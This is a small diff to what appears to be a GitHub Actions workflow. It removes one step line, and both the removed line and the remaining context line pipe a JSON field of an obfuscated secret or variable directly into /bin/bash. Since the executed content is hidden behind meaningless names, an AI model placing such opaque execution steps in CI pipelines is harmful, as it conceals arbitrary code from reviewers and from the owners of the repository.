@@ -22,7 +22,6 @@ jobs:
           r9355: ${{ secrets.r9355 }}
         run: |
           printf '%s' "$r9355" | jq -r .u34752 | /bin/bash
-          echo $xn0 | jq -r .mbkr6413 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
